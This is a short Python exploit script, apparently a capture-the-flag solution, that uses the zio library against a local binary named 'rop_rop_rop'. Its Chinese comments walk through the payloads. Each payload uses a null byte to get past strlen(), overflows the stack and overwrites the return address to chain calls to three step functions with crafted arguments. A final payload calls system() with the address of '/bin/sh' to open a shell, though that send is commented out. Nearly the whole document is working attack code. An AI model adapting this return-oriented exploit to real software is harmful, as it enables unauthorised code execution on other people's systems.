#!/usr/bin/env python
# encoding:utf-8

import zio

payloadForStep1 =  "A" * 7 + "\x00" # 使用 0x00 绕过 strlen()
payloadForStep1 +=  "@" * 8 # 
payloadForStep1 +=  zio.l32(0x804871e) # Step1() 的地址
payloadForStep1 +=  zio.l32(0x804867d) # main() 的地址
payloadForStep1 +=  "\x00" * 4 # Step1 的参数3
payloadForStep1 +=  "AAAA" # Step1 的参数2
#payloadForStep1 +=  "\xd5\xc4\xb3\xa2" # Step1 的参数 1
payloadForStep1 += zio.l32(0xA2B3C4D5) # Step1 的参数 1

payloadForStep2 =  "A" * 7 + "\x00" # 使用 0x00 绕过 strlen()
payloadForStep2 +=  "@" * 8 # 
payloadForStep2 +=  zio.l32(0x8048766) # Step2() 的地址
payloadForStep2 +=  zio.l32(0x804867d) # main() 的地址
payloadForStep2 +=  "AAAA" # Step2 的参数2
payloadForStep2 +=  zio.l32(0xFF25A7D4) # Step2 的参数 1

payloadForStep3 =  "A" * 7 + "\x00" # 使用 0x00 绕过 strlen()
payloadForStep3 +=  "@" * 8 # 
payloadForStep3 +=  zio.l32(0x80487A3) # Step3() 的地址
payloadForStep3 +=  zio.l32(0x804867d) # main() 的地址
payloadForStep3 +=  "\x82\x9a\x82\x9a" # Step3 的参数3
payloadForStep3 +=  "\\f\\f\\f\\f" # Step3 的参数2
payloadForStep3 +=  "\xff\xff\xff\xff" # Step3 的参数 1

payloadForStep4 =  "A" * 7 + "\x00" # 使用 0x00 绕过 strlen()
payloadForStep4 +=  "@" * 8 # 
payloadForStep4 += zio.l32(0x804A090) # system() 的地址
payloadForStep4 += "BBBB" # 执行 system() 就随便跳了
payloadForStep4 += zio.l32(0x804A04C) # "/bin/sh" 的地址


Io = zio.zio("./rop_rop_rop")

Io.readline()
Io.readline()
Io.write(payloadForStep1)
Io.write("\n")

Io.readline()
Io.readline()
Io.write(payloadForStep2)
Io.write("\n")

#Io.readline()
#Io.readline()
#Io.write(payloadForStep3)

#Io.readline()
#Io.readline()
#Io.write(payloadForStep4)

Io.interact()
